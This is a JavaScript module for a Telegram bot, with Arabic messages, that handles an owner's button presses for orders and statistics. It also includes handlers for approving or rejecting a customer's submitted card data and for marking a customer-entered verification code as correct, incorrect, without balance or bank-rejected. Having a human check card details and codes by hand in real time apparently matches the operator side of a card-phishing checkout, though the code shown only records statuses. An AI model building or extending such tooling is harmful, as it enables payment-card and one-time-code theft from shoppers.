'use strict';

const approvalStore = require('../../../lib/checkoutApprovalStore');
const { getBot } = require('../bot');
const { isOwner, mainKeyboard, sendOrderDetails, updateOrderStatus, sendStats } = require('./helpers');

const setupCallbacks = () => {
  const bot = getBot();
  if (!bot) return;

  bot.on('callback_query', async query => {
    if (!isOwner(query.message.chat.id)) return;
    const data = query.data;
    const chatId = query.message.chat.id;

    bot.answerCallbackQuery(query.id);

    if (data === 'orders_pending') {
      bot.emit('text', { chat: { id: chatId }, text: '/orders pending' }, ['/orders pending', 'pending']);
      return;
    }

    if (data === 'orders_all') {
      bot.emit('text', { chat: { id: chatId }, text: '/orders' }, ['/orders', '']);
      return;
    }

    if (data === 'stats') {
      await sendStats(chatId, '');
      return;
    }

    if (data === 'stats_today') {
      await sendStats(chatId, 'today');
      return;
    }

    if (data === 'stats_month') {
      await sendStats(chatId, 'month');
      return;
    }

    if (data === 'refresh') {
      bot.sendMessage(chatId, '✅ تم التحديث', mainKeyboard);
      return;
    }

    if (data.startsWith('approve_card_')) {
      const sessionId = data.replace('approve_card_', '');
      approvalStore.setStatus(sessionId, 'approved');
      bot.sendMessage(chatId, '✅ تمت الموافقة على بيانات البطاقة');
      return;
    }

    if (data.startsWith('reject_card_invalid_')) {
      const sessionId = data.replace('reject_card_invalid_', '');
      approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة - كود غير صحيح');
      bot.sendMessage(chatId, '❌ تم رفض البطاقة - كود غير صحيح');
      return;
    }

    if (data.startsWith('reject_card_nobalance_')) {
      const sessionId = data.replace('reject_card_nobalance_', '');
      approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة - لا يوجد رصيد');
      bot.sendMessage(chatId, '❌ تم رفض البطاقة - لا يوجد رصيد');
      return;
    }

    if (data.startsWith('reject_card_rejected_')) {
      const sessionId = data.replace('reject_card_rejected_', '');
      approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة');
      bot.sendMessage(chatId, '❌ تم رفض البطاقة - رفض البنك');
      return;
    }

    if (data.startsWith('reject_card_')) {
      const sessionId = data.replace('reject_card_', '');
      approvalStore.setStatus(sessionId, 'rejected');
      bot.sendMessage(chatId, '❌ تم رفض بيانات البطاقة');
      return;
    }

    if (data.startsWith('verify_correct_')) {
      const sessionId = data.replace('verify_correct_', '');
      approvalStore.setVerificationResult(sessionId, 'correct');
      bot.sendMessage(chatId, '✅ تم تأكيد صحة الكود - الكود صحيح');
      return;
    }

    if (data.startsWith('verify_incorrect_')) {
      const sessionId = data.replace('verify_incorrect_', '');
      approvalStore.setVerificationResult(sessionId, 'incorrect');
      bot.sendMessage(chatId, '❌ تم رفض الكود - الكود غير صحيح');
      return;
    }

    if (data.startsWith('verify_nobalance_')) {
      const sessionId = data.replace('verify_nobalance_', '');
      approvalStore.setVerificationResult(sessionId, 'nobalance');
      bot.sendMessage(chatId, '💳 لا يوجد رصيد - تم إشعار العميل');
      return;
    }

    if (data.startsWith('verify_rejected_')) {
      const sessionId = data.replace('verify_rejected_', '');
      approvalStore.setVerificationResult(sessionId, 'rejected');
      bot.sendMessage(chatId, '🚫 تم رفض البطاقة - تم إشعار العميل');
      return;
    }

    if (data.startsWith('approve_')) {
      const id = parseInt(data.split('_')[1]);
      await updateOrderStatus(chatId, id, 'approved');
      return;
    }

    if (data.startsWith('reject_')) {
      const id = parseInt(data.split('_')[1]);
      await updateOrderStatus(chatId, id, 'rejected');
      return;
    }

    if (data.startsWith('details_')) {
      const id = parseInt(data.split('_')[1]);
      await sendOrderDetails(chatId, id);
    }
  });
};

module.exports = { setupCallbacks };
